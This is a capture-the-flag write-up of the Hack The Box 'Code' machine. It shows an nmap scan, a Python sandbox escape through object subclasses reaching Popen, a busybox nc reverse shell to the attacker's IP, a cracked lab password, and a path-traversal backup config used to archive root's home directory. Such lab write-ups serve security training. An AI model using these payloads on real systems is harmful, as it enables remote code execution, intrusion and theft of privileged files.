---
title: 'HTB-Code'
published: 2025-07-10
draft: false
toc: true
tags: ['Symlinks', 'python']
---

---
```
Scope:
10.10.11.62
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -T5 --min-rate=5000 -Pn code.htb

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    syn-ack Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 5000/TCP - HTTP

![](attachments/17900db9728e5b43ec9591e79ffc434d.png)

I tried to run a reverse shell right away but it would not let me:

![](attachments/420f690728ae3f952ea57894a7bb9985.png)

I went ahead and created an account:

![](attachments/96560aa6d0bc2ab207b0478af98b6a47.png)

```
test
test
```

After a lot of trial and error I found that this nifty piece of code returned a different error:

```python
print((()).__class__.__bases__[0].__subclasses__())
```

![](attachments/098055cac8256e0529497d3e3145e9a0.png)

Naturally I was not going to go over it all by hand so I opened up `caido` to view the request differently:

![](attachments/43f4566d6cb8c35a477cbd214eefc5f1.png)

![](attachments/1cb5ace849fef376892334654692015b.png)

So in order to quickly count it I inserted the response inside a `response.txt` file, and wrote a `python` script to go over the file and find `popen`:

```python
import json
import re

with open('response.txt') as f:
    data = json.load(f)

output = data['output']

# Match whole class entry, not just class name
class_entries = re.findall(r"<class '([^']+)'>", output)

for idx, name in enumerate(class_entries):
    if 'popen' in name.lower():
        print(f'Found at index: {idx}')
        print(f'Class name: {name}')
        break
else:
    print('popen not found.')
```

This gave me the following output:

![](attachments/c19c8c3ad12963ab1b51f6536b04cee7.png)

I tried it in the web app but it was off by 1:

```python
raise Exception((()).__class__.__bases__[0].__subclasses__()[317].__name__)
```

![](attachments/325e70a97c7593f2e37ea7800af045b4.png)

### Reverse Shell

Now I had to modify the payload in such a way that it would give me a reverse shell.

```python
raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317](
    "bash -c 'busybox nc 10.10.14.17 80 -e bash'", shell=True, stdout=-1).communicate()))
```

I then clicked **Run** and checked my listener.

# Foothold
## Shell as app-production

![](attachments/65a474a31fa12c1a43e356f560a98c33.png)

I got a shell, let's start enum.

### user.txt

![](attachments/109d62e23f61be24dea4eea88a6b28fe.png)

## Enumeration

![](attachments/237d914add69d84764e2aca3726f9522.png)

![](attachments/69e11143af3dfce01281c5cbc970fdc2.png)

![](attachments/851b810e2ea690905348b31418212cda.png)

```
martin
nafeelswordsmaster
```

Time to move laterally.

## Lateral Movement

![](attachments/c0f6d22e4945d296ea2b79e911d56f45.png)

![](attachments/e07bc26664efa5eb6c059836b1be290e.png)

# Privilege Escalation
## Symlinks 

So in order to steal all info from *root* we can use the following script:

```bash
# symlink script to steal everything from *root* and zip it up
cat > root-steal.json << EOF  
{  
"destination": "/home/martin/",  
"multiprocessing": true,  
"verbose_log": true,  
"directories_to_archive": [  
"/home/....//root/"  
]  
}  
EOF
```

![](attachments/5fd07dd668d062c47226dda42dd095ef.png)

As soon as we untar the folder we can access anything from *root*'s directory:

![](attachments/a10b8b564de5905de17bbe162f6d422d.png)

### root.txt

![](attachments/b6cdcbbd6a7961e290a801eaac5a3f5e.png)

![](attachments/3fdefd2d5873ca74f4438e851c6139a7.png)

---